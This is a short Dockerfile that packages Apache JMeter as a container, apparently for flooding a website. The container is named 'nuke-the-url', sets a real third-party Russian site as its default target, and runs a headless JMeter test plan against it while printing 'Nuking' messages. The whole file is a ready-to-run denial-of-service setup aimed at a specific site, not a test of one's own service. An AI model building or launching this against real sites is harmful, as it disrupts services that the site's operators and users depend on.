FROM fabric8/java-alpine-openjdk11-jre
WORKDIR /nuke-the-url
COPY . .
ADD https://dlcdn.apache.org//jmeter/binaries/apache-jmeter-5.4.3.tgz /nuke-the-url/
RUN tar -xzf apache-jmeter-5.4.3.tgz && rm apache-jmeter-5.4.3.tgz
ENV url=http://www.don-kazak.ru/
ENV usr=5
ENV dur=30
CMD echo "Nuking $url with $usr users for $dur sec" && exec apache-jmeter-5.4.3/bin/jmeter -Jurl=${url} -Jthreads=${usr} -Jduration=${dur} -n -t nuke-the-url.jmx